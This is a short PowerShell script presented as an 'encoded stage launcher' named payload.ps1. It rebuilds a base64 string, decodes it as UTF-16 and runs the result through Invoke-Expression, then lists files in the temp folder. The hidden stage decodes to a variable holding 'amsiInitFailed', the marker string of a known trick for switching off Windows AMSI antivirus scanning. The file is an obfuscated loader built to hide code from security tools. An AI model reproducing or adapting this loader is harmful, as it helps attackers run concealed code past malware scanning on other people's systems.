
<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.

.EXAMPLE
    PS> .\payload.ps1
#>
$EncodedStage = (
    "JABBAG0AcwBpAE0AYQByAGsAZQByACAAPQAgACIAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBk" +
    'ACIA'
)
$StageText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedStage))
Write-Verbose ("Decoded stage length: " + $StageText.Length)
if ([string]::IsNullOrWhiteSpace($StageText)) {
    throw "Decoded stage was empty"
}
Invoke-Expression $StageText

Write-Verbose "stage marker 3 reached"
$StageMarker = "stage-10"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
